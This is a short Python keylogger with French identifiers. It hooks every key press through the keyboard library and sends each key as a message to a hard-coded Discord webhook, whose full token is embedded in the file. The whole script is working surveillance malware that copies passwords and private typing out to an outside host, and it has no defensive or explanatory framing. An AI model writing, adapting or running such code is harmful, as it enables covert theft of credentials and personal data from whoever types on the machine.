import keyboard
import requests


webhook_url = "https://discord.com/api/webhooks/1410000899102867466/2HSu9ya1NGr0iCyqr4U8n2ZpKcnzrcVOtpDl5E3Xkak6HBExWz58IuNMADLN_55BuJDR"

def envoyer_webhook(touche):
    payload = {"content": f"[{touche}]"}
    try:
        requests.post(webhook_url, json=payload)
    except Exception as e:
        print(f"Erreur lors de l'envoi au webhook : {e}")

def ecouter_touches():
    def touche_appuye(event):
        if event.event_type == keyboard.KEY_DOWN:
            touche = event.name
            print(f"[{touche}]")
            envoyer_webhook(touche)


    keyboard.hook(touche_appuye)
    keyboard.wait()  

if __name__ == "__main__":
    print("Écoute des touches pressées (CTRL+C pour quitter)...")
    ecouter_touches()
